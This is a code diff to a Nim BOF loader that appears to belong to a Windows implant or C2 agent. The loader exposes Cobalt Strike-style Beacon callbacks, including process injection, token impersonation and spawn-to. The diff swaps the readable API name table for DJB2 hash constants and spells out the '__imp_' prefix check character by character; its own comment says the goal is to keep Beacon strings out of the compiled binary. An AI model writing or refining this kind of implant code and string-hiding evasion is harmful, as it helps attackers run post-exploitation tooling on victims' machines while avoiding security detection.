@@ -248,46 +248,51 @@ when defined(windows):
 
   # ── Beacon API name → function-pointer table ──────────────────────────────────
 
-  type BeaconEntry = tuple[name: string; p: pointer]
+  # BOF callback API — DJB2 hash table (no Beacon* string literals in binary)
+  type BofEntry = tuple[h: uint32; p: pointer]
 
-  # Initialised once at module load; proc addresses are stable runtime constants.
-  let gBeaconApi: seq[BeaconEntry] = @[
-    ("BeaconDataParse",              cast[pointer](beaconDataParse)),
-    ("BeaconDataInt",                cast[pointer](beaconDataInt)),
-    ("BeaconDataShort",              cast[pointer](beaconDataShort)),
-    ("BeaconDataLength",             cast[pointer](beaconDataLength)),
-    ("BeaconDataExtract",            cast[pointer](beaconDataExtract)),
-    ("BeaconOutput",                 cast[pointer](beaconOutput)),
-    ("BeaconPrintf",                 cast[pointer](beaconPrintf)),
-    ("BeaconFormatAlloc",            cast[pointer](beaconFormatAlloc)),
-    ("BeaconFormatReset",            cast[pointer](beaconFormatReset)),
-    ("BeaconFormatFree",             cast[pointer](beaconFormatFree)),
-    ("BeaconFormatAppend",           cast[pointer](beaconFormatAppend)),
-    ("BeaconFormatPrintf",           cast[pointer](beaconFormatPrintf)),
-    ("BeaconFormatToString",         cast[pointer](beaconFormatToStr)),
-    ("BeaconFormatInt",              cast[pointer](beaconFormatInt)),
-    ("BeaconIsAdmin",                cast[pointer](beaconIsAdmin)),
-    ("BeaconGetSpawnTo",             cast[pointer](beaconGetSpawnTo)),
-    ("toWideChar",                   cast[pointer](bofToWideChar)),
-    ("BeaconInjectProcess",          cast[pointer](beaconInjectProcess)),
-    ("BeaconInjectTemporaryProcess", cast[pointer](beaconInjectTmp)),
-    ("BeaconCleanupProcess",         cast[pointer](beaconCleanupProcess)),
-    ("BeaconSpawnTemporaryProcess",  cast[pointer](beaconSpawnTmp)),
-    ("BeaconRevertToken",            cast[pointer](beaconRevertToken)),
-    ("BeaconUseToken",               cast[pointer](beaconUseToken)),
-    ("BeaconSetSleep",               cast[pointer](beaconSetSleep)),
+  proc bofDjb2(s: string): uint32 =
+    result = 5381'u32
+    for c in s: result = ((result shl 5) + result) xor uint32(ord(c))
+
+  let gBofApiTable: seq[BofEntry] = @[
+    (0x6AB4F0E4'u32, cast[pointer](beaconDataParse)),
+    (0x0D4393E2'u32, cast[pointer](beaconDataInt)),
+    (0x6AA76263'u32, cast[pointer](beaconDataShort)),
+    (0x025056ED'u32, cast[pointer](beaconDataLength)),
+    (0x222914DC'u32, cast[pointer](beaconDataExtract)),
+    (0x4862655E'u32, cast[pointer](beaconOutput)),
+    (0x51E86B76'u32, cast[pointer](beaconPrintf)),
+    (0xA0F210CF'u32, cast[pointer](beaconFormatAlloc)),
+    (0xA1B55237'u32, cast[pointer](beaconFormatReset)),
+    (0xF55C31F6'u32, cast[pointer](beaconFormatFree)),
+    (0xBF7A316C'u32, cast[pointer](beaconFormatAppend)),
+    (0xE45DFB35'u32, cast[pointer](beaconFormatPrintf)),
+    (0xEF693D8C'u32, cast[pointer](beaconFormatToStr)),
+    (0x5502EE31'u32, cast[pointer](beaconFormatInt)),
+    (0xB4D2F8B4'u32, cast[pointer](beaconIsAdmin)),
+    (0x1A46AB57'u32, cast[pointer](beaconGetSpawnTo)),
+    (0x5C5E4379'u32, cast[pointer](bofToWideChar)),
+    (0x681A2615'u32, cast[pointer](beaconInjectProcess)),
+    (0x8F9FB24E'u32, cast[pointer](beaconInjectTmp)),
+    (0x9909426A'u32, cast[pointer](beaconCleanupProcess)),
+    (0x3A9E0DAA'u32, cast[pointer](beaconSpawnTmp)),
+    (0x4BE276B8'u32, cast[pointer](beaconRevertToken)),
+    (0x0338FF39'u32, cast[pointer](beaconUseToken)),
+    (0x1EB39E2C'u32, cast[pointer](beaconSetSleep)),
   ]
 
   proc beaconApiLookup(name: string): pointer =
-    for (n, p) in gBeaconApi:
-      if n == name: return p
+    let h = bofDjb2(name)
+    for (eh, ep) in gBofApiTable:
+      if eh == h: return ep
     nil
 
   # ── External symbol resolution ────────────────────────────────────────────────
 
   proc resolveExternal(name: string): pointer =
     ## Returns an 8-byte IAT thunk for __imp_ symbols; nil for anything else.
-    if not name.startsWith("__imp_"): return nil
+    if name.len < 6 or name[0]!='_' or name[1]!='_' or name[2]!='i' or name[3]!='m' or name[4]!='p' or name[5]!='_': return nil
     let impName = name[6..^1]
 
     # Allocate an 8-byte import-table thunk slot (holds the function pointer).
